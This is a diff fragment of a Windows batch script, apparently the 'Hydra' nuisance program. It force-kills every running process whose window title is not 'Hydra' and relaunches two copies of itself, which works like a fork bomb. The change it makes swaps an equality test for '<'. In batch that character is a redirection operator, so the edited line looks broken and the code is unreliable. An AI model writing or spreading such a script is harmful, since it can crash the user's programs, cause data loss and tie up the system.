@@ -6,7 +6,7 @@ FOR /F "tokens=* USEBACKQ" %%F IN (`tasklist /FI "WINDOWTITLE eq Hydra" ^| find/
 SET windowcount=%%F
 )
 TASKKILL /F /FI "WINDOWTITLE ne Hydra"
-IF "%windowcount%"=="%n%" (
+IF "%windowcount%"<"%n%" (
 START Hydra.bat
 START Hydra.bat
 set /a n+=1
